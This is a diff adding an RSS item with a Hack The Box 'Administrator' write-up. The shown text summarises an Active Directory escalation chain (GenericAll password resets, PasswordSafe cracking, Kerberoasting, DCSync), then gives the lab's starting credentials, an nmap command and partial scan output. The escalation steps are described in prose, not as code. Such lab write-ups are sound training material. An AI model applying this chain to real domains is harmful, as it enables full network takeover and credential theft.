@@ -16,6 +16,403 @@
     
     
     <item>
+      <title>Administrator - Hack The Box </title>
+      <link>http://localhost:1313/htb/medium/administrator/</link>
+      <pubDate>Tue, 29 Apr 2025 00:05:30 -0400</pubDate>
+      
+      <guid>http://localhost:1313/htb/medium/administrator/</guid>
+      <description>
+        
+        
+        &lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Administrator-LOGO.png&#34; alt=&#34;Administrator-LOGO&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;This Hack The Box Administrator machine is focused on exploitation of Active Directory weaknesses. Starting with user credentials, we used Bloodhound to map the domain, quickly identifying exploitable &lt;code&gt;GenericAll&lt;/code&gt; permissions that allowed us to reset passwords using tools like &lt;code&gt;net rpc&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Our investigation then uncovered an FTP server with a PasswordSafe file. Cracking this file with &lt;code&gt;pwsafe2john&lt;/code&gt; and John the Ripper provided further credentials, which we leveraged to exploit ForceChangePassword privileges and perform a targeted Kerberoast for even higher access. The final step involved a &lt;code&gt;DCSync&lt;/code&gt; attack via Impacket, retrieving domain admin hashes and granting complete control. This showcases a direct path from initial access to domain dominance by chaining AD misconfigurations and service vulnerabilities.&lt;/p&gt;
+&lt;div class=&#34;hx:overflow-x-auto hx:mt-6 hx:flex hx:rounded-lg hx:border hx:py-2 hx:ltr:pr-4 hx:rtl:pl-4 hx:contrast-more:border-current hx:contrast-more:dark:border-current hx:border-blue-200 hx:bg-blue-100 hx:text-blue-900 hx:dark:border-blue-200/30 hx:dark:bg-blue-900/30 hx:dark:text-blue-200&#34;&gt;
+  &lt;div class=&#34;hx:ltr:pl-3 hx:ltr:pr-2 hx:rtl:pr-3 hx:rtl:pl-2&#34;&gt;&lt;div class=&#34;hx:select-none hx:text-xl&#34; style=&#34;font-family: &#39;Apple Color Emoji&#39;, &#39;Segoe UI Emoji&#39;, &#39;Segoe UI Symbol&#39;;&#34;&gt;ℹ️&lt;/div&gt;&lt;/div&gt;
+
+  &lt;div class=&#34;hx:w-full hx:min-w-0 hx:leading-7&#34;&gt;
+    &lt;div class=&#34;hx:mt-6 hx:leading-7 hx:first:mt-0&#34;&gt;&lt;p&gt;Tags:&lt;/p&gt;
+&lt;details class=&#34;hx:last-of-type:mb-0 hx:rounded-lg hx:bg-neutral-50 hx:dark:bg-neutral-800 hx:p-2 hx:mt-4 hx:group&#34; &gt;
+  &lt;summary class=&#34;hx:flex hx:items-center hx:cursor-pointer hx:select-none hx:list-none hx:p-1 hx:rounded-sm hx:transition-colors hx:hover:bg-gray-100 hx:dark:hover:bg-neutral-800 hx:before:mr-1 hx:before:inline-block hx:before:transition-transform hx:before:content-[&#39;&#39;] hx:dark:before:invert hx:rtl:before:rotate-180 hx:group-open:before:rotate-90&#34;&gt;
+    &lt;strong class=&#34;hx:text-lg&#34;&gt;show tags&lt;/strong&gt;
+  &lt;/summary&gt;
+  &lt;div class=&#34;hx:p-2 hx:overflow-hidden&#34;&gt;
+    &lt;ul&gt;
+&lt;li&gt;Windows&lt;/li&gt;
+&lt;li&gt;Active Directory&lt;/li&gt;
+&lt;li&gt;Bloodhound&lt;/li&gt;
+&lt;li&gt;GenericAll&lt;/li&gt;
+&lt;li&gt;FTP&lt;/li&gt;
+&lt;li&gt;ForceChangePassword&lt;/li&gt;
+&lt;li&gt;psafe3&lt;/li&gt;
+&lt;li&gt;passwordsafe&lt;/li&gt;
+&lt;/ul&gt;
+  &lt;/div&gt;
+&lt;/details&gt;&lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;h2&gt;Enumeration&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;enumeration&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#enumeration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;div class=&#34;hx:overflow-x-auto hx:mt-6 hx:flex hx:rounded-lg hx:border hx:py-2 hx:ltr:pr-4 hx:rtl:pl-4 hx:contrast-more:border-current hx:contrast-more:dark:border-current hx:border-yellow-100 hx:bg-yellow-50 hx:text-yellow-900 hx:dark:border-yellow-200/30 hx:dark:bg-yellow-700/30 hx:dark:text-yellow-200&#34;&gt;
+  &lt;div class=&#34;hx:ltr:pl-3 hx:ltr:pr-2 hx:rtl:pr-3 hx:rtl:pl-2&#34;&gt;&lt;div class=&#34;hx:select-none hx:text-xl&#34; style=&#34;font-family: &#39;Apple Color Emoji&#39;, &#39;Segoe UI Emoji&#39;, &#39;Segoe UI Symbol&#39;;&#34;&gt;⚠️&lt;/div&gt;&lt;/div&gt;
+
+  &lt;div class=&#34;hx:w-full hx:min-w-0 hx:leading-7&#34;&gt;
+    &lt;div class=&#34;hx:mt-6 hx:leading-7 hx:first:mt-0&#34;&gt;&lt;p&gt;&lt;strong&gt;User Credentials!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;The following information was provided by Hack The Box:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;As is common in real-life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Username:&lt;/strong&gt; Olivia&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Password:&lt;/strong&gt; ichliebedich&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;p&gt;As always let&amp;rsquo;s start by enumerating the target with the help of NMAP.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo nmap -sS -sV -sC -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,58289,61803,61807,61809,61831,61864 -Pn -n -vvv -oA nmap/allPorts 10.10.11.42&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3&gt;Port Scan&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;port-scan&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#port-scan&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.95 scan initiated Wed Apr  2 12:09:36 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,58289,61803,61807,61809,61831,61864 -Pn -n -vvv -oA nmap/allPorts 10.10.11.42&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Nmap&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scan&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;report&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;10.10.11.42&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;up&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;received&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.068&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;latency&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Scanned&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;04&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;02&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;37&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EDT&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;74&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PORT&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;STATE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SERVICE&lt;/span&gt;       &lt;span class=&#34;n&#34;&gt;REASON&lt;/span&gt;          &lt;span class=&#34;n&#34;&gt;VERSION&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ftp&lt;/span&gt;           &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ftpd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ftp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;syst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;SYST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows_NT&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;53&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;domain&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Simple&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DNS&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Plus&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;88&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kerberos&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sec&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Kerberos&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;04&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;02&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;19&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Z&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;135&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;139&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;netbios&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssn&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;netbios&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssn&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;389&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ldap&lt;/span&gt;          &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Active&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Directory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LDAP&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;htb0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Site&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;First&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Site&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;microsoft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ds&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;464&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kpasswd5&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;593&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ncacn_http&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;over&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTP&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;636&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tcpwrapped&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;3268&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ldap&lt;/span&gt;          &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Active&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Directory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LDAP&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;htb0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Site&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;First&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Site&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;3269&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tcpwrapped&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt;
